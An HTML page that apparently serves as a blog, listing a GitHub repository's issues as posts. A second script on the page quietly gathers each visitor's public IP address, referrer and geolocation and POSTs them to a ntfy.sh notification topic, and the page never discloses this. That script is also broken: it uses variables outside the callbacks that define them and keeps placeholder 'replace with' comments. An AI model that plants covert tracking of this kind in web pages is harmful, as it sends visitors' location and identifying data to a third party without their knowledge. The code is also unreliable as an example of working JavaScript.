<!DOCTYPE html>
<html>
<head>
  <style>
    #container {
      display: flex;
      justify-content: center;
      align-items: center;
      background: black;
      color:  red;
      height: 100vh;
      flex-direction: column;
    }
  </style>
</head>
<body>
  <div id="container"></div>

  <script>
    // Fetch JSON data from the GitHub API
    fetch("https://api.github.com/repos/BlitzdUK/blog/issues")
      .then(response => response.json())
      .then(data => {
        // Create a div to hold the JSON data
        const container = document.getElementById("container");

        // Loop through each issue and display the title, message, and time
        data.forEach(issue => {
          const title = document.createElement("h2");
          title.textContent = issue.title;

          const message = document.createElement("p");
          message.textContent = issue.body;

          const time = document.createElement("p");
          time.textContent = issue.created_at;

          container.appendChild(title);
          container.appendChild(message);
          container.appendChild(time);
        });
      });
  </script>
  <script>
  fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    // Use the ipAddress as needed
    console.log(ipAddress);
  })
  .catch(error => {
    console.log('Error:', error);
  });

const referer = document.referrer;
// Use the referer as needed
console.log(referer);

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(position => {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    // Use latitude and longitude as needed
    console.log(latitude, longitude);
  }, error => {
    console.log('Error:', error);
  });
} else {
  console.log('Geolocation is not supported');
}

const url = 'https://ntfy.sh/blitzd';
const data = {
  ip: ipAddress, // Replace with the actual IP address variable
  referer: referer, // Replace with the actual referer variable
  latitude: latitude, // Replace with the actual latitude variable
  longitude: longitude // Replace with the actual longitude variable
};

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
})
  .then(response => {
    if (response.ok) {
      console.log('IP address posted successfully');
    } else {
      console.log('Error:', response.status);
    }
  })
  .catch(error => {
    console.log('Error:', error);
  });


</script>
</body>
</html>
